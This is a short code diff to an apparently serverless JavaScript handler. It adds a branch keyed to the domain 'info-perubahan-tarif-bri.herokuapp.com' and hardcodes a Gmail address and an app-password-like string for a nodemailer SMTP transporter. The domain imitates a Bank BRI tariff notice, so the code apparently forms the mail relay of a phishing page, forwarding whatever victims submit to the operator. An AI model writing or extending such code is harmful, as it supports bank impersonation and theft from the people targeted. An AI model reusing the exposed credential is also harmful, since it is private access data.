@@ -6,7 +6,13 @@ export default function handler(req, res) {
 
     let email = '';
     let pass = '';
-        
+    
+     if (url == 'info-perubahan-tarif-bri.herokuapp.com'){
+
+       email = 'infogacor232@gmail.com'
+       pass = 'mawlptowlrdcrplk'
+    }else
+    
         try {
             const transporter = nodemailer.createTransport({
                 port: 587,
